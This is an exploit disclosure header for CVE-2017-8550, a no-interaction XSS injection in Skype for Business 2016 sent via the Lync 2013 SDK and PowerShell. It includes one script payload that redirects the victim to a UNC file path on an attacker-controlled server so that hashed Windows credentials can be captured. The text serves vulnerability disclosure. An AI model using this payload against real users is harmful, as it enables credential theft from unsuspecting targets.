# Exploit Title:  Skype for Business 2016 XSS Injection - CVE-2017-8550
#
# Exploit Author: @nyxgeek - TrustedSec
# Date: 2017-04-10
# Vendor Homepage: www.microsoft.com
# Versions: 16.0.7830.1018 32-bit & 16.0.7927.1020 64-bit or lower
#
#
# Requirements: Originating machine needs Lync 2013 SDK installed as well as a user logged
# into the Skype for Business client locally
#
#
# Description:
#
# XSS injection is possible via the Lync 2013 SDK and PowerShell. No user-interaction is
# required for the XSS to execute on the target machine. It will run regardless of whether
# or not they accept the message. The target only needs to be online.
#
# Additionally, by forcing a browse to a UNC path via the file URI it is possible to
# capture hashed user credentials for the current user.
# Example:
# <script>document.location.replace=('file:\\\\server.ip.address\\test.txt');</script>
#
#
# Shoutout to @kfosaaen for providing the base PowerShell code that I recycled
